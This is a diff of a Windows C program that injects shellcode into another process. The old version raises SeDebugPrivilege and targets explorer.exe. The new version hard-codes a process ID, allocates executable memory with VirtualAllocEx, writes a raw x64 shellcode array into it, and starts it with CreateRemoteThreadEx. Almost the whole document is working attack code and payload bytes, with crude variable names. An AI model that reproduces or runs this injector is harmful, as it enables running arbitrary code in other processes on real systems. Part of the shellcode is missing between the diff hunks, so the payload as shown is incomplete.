@@ -1,69 +1,20 @@
 #include <stdio.h>
 #include <windows.h>
-#include <TlHelp32.h>
+#include <stdarg.h>
+#include <cstdio>
+
+#define tigrinho(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
+#define ohshit(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
+#define bitch(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
+
 
 int main(void)
 {
-    HANDLE hProcessToken;
+    DWORD pid = 16888;
 
-    BOOL kfk = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
-    if (!kfk)
-    {
-        printf("[-] Error to Open The Process Token" + GetLastError());
-        return 1;
-    }
-
-    LUID lpLuid;
-    BOOL idk = LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &lpLuid);
-
-    if (!idk)
-    {
-        printf("[-] Error to Retrieve the LUID" + GetLastError());
-        return 1;
-    }
-
-    TOKEN_PRIVILEGES tp;
-
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = lpLuid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    BOOL mnh = AdjustTokenPrivileges(hProcessToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
-
-    if (!mnh)
-    {
-        printf("[-] Error to Adjust Token Privileges %lu\n", GetLastError());
-        return 1;
-    }
-
-    CloseHandle(hProcessToken);
-
-    PROCESSENTRY32 entry;
-    DWORD pid;
-
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    if (Process32First(snapshot, &entry) == TRUE)
-    {
-        while (Process32Next(snapshot, &entry) == TRUE)
-        {
-            if (stricmp(entry.szExeFile, "explorer.exe") == 0)
-            {
-                pid = entry.th32ProcessID;
-            }
-        }
-    }
-
-    HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-
-    if (hExplorer == NULL)
-    {
-        printf("[-] Error to Open Process: Explorer.exe %lu\n", GetLastError());
-        return 1;
-    }
-
-    unsigned char shellCode[] =
+    unsigned char hiMom[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
     "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -102,28 +53,14 @@ int main(void)
     "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
     "\x2a\x0a\x41\x89\xda\xff\xd5";
 
-    LPVOID lpRemoteMemory = VirtualAllocEx(hExplorer, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE);
+    LPVOID lpRemote = VirtualAllocEx(hProcess, NULL, sizeof(hiMom), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
-    BOOL opk = WriteProcessMemory(hExplorer, lpRemoteMemory, shellCode, sizeof(shellCode), NULL);
+    WriteProcessMemory(hProcess, lpRemote, hiMom, sizeof(hiMom), NULL);
 
-    if (!opk)
-    {
-        printf("[-] Error to Write in Explorer.exe %lu\n", GetLastError());
-        return 1;
-    }
+    DWORD fuck;
+    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemote, NULL, 0, 0, &fuck);
 
-    HANDLE hThread = CreateRemoteThread(hExplorer, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteMemory, NULL, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
 
-    if (!hThread)
-    {
-        printf("[-] Error to create remote Thread %lu\n", GetLastError());
-        return 1;
-    }
-
-    printf("[+] Remote thread created successfully!\n");
-
-    CloseHandle(hThread);
-    CloseHandle(hExplorer);
-
-    return 0;
+    return EXIT_SUCCESS;
 }
